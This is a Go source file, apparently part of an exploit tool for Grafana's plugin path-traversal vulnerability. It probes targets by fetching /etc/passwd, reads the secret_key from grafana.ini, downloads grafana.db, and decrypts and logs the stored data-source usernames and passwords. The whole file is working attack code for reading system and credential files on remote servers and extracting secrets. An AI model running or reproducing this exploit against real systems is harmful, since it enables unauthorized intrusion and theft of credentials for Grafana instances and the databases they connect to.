package internal

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	_ "github.com/glebarez/sqlite"
	"github.com/grafana/grafana/pkg/util"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

func getTargetKey() (re string) {
	if ConfFile == "" {
		ConfFile = "/etc/grafana/grafana.ini"
	}
	_url := fmt.Sprintf("%s/public/plugins/%s/%s%s", Target, Plugin, Payload, ConfFile)
	_buf := DoReq(_url)

	if !strings.Contains(_buf, "Grafana Configuration Example") {
		return ""
	}
	lines := strings.Split(_buf, "\n")
	for idx := range lines {
		if strings.HasPrefix(lines[idx], ";secret_key =") {
			_key := strings.Trim(strings.Split(lines[idx], "=")[1], " ")
			Logger.Criticalf("Got secret_key [%s]", _key)
			return _key
		}
	}
	return ""
}

func getAllDatasource() {
	if DBFile == "" {
		DBFile = "/var/lib/grafana/grafana.db"
	}
	_url := fmt.Sprintf("%s/public/plugins/%s/%s%s", Target, Plugin, Payload, DBFile)
	_buf := DoReq(_url)
	//println(_url)
	if strings.HasPrefix(_buf, "SQLite format 3") {
		var tmpDB *os.File
		var db *sql.DB
		var err error
		if OutFile != "" {
			dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
			OutFile = filepath.Join(dir, OutFile)
			Logger.Criticalf("write file ==> [%s]", OutFile)
			err = ioutil.WriteFile(OutFile, []byte(_buf), 0666)
			if err != nil {
				panic(err)
			}
			db, err = sql.Open("sqlite3", OutFile)
			if err != nil {
				panic(err)
			}
		} else {
			_dir := os.TempDir()
			tmpDB, err = ioutil.TempFile(_dir, "grafana")
			//println(tmpDB.Name())
			if err != nil {
				panic(err)
			}
			//Logger.Debug("write file!")
			// Remove this file after on exit.
			defer func() {
				err := os.Remove(tmpDB.Name())
				if err != nil {
					fmt.Println(err)
				}
			}()
			// Write database to file.
			_, err = tmpDB.Write([]byte(_buf)) //参数为文件的byte数组
			if err != nil {
				panic(err)
			}
			err = tmpDB.Close()
			if err != nil {
				panic(err)
			}
			// Open DB.
			db, err = sql.Open("sqlite3", tmpDB.Name())
			if err != nil {
				panic(err)
			}
		}
		//Logger.Debug("Test")
		cntR, err := db.Query("SELECT count(1) FROM data_source")
		if err != nil {
			panic(err)
		}
		var cnt int16
		cntR.Scan(&cnt)
		Logger.Criticalf("There is [%d] records in db.", cnt)

		rows, err := db.Query("SELECT `type`, `name`, access, url, password, `user`, database, basic_auth_user, basic_auth_password, secure_json_data FROM data_source")
		for rows.Next() {
			var stype string
			var sname string
			var saccess string
			var surl string
			var spassword string
			var suser string
			var sdatabase string
			var sbuser string
			var json_data string
			var sbpass string
			err = rows.Scan(&stype, &sname, &saccess, &surl, &spassword, &suser, &sdatabase, &sbuser, &sbpass, &json_data)
			if err != nil {
				panic(err)
			}

			var _json SecureData
			err := json.Unmarshal([]byte(json_data), &_json)
			if err != nil {
				panic(err)
			}
			//println(json_data)
			//log.Println(_json)
			_pass := decode(Key, _json.Password)
			_authpass := decode(Key, _json.BasicPassword)
			Logger.Criticalf("type:[%s]\tname:[%s]\t\turl:[%s]\tuser:[%s]\tpassword[%s]\tdatabase:[%s]\tbasic_auth_user:[%s]\tbasic_auth_password:[%s]", stype, sname, surl, suser, _pass, sdatabase, sbuser, _authpass)
		}
	} else {
		Logger.Errorf("grafana.db not found!")
	}
}

func checkVuln() (re string) {
	if Plugin == "" {
		for idx := range PluginUrls {
			_url := fmt.Sprintf("%s/public/plugins/%s/%s/etc/passwd", Target, PluginUrls[idx], Payload)
			buf := DoReq(_url)
			if strings.Contains(buf, "root:/root:") {
				Logger.Criticalf("Target vulnerable has plugin [%s]", PluginUrls[idx])
				return PluginUrls[idx]
			}
		}
		Logger.Error("Target not Vuln.")
		return ""
	} else {
		_url := fmt.Sprintf("%s/public/plugins/%s/%s/etc/passwd", Target, Plugin, Payload)
		buf := DoReq(_url)
		if strings.Contains(buf, "root:/root:") {
			Logger.Criticalf("Target vulnerable has plugin [%s]", Plugin)
			return Plugin
		}
	}
	return ""
}

func decode(key string, cipher string) (plainText string) {
	buf, _ := base64.StdEncoding.DecodeString(cipher)
	_re, _ := util.Decrypt(buf, key)
	return string(_re)
}
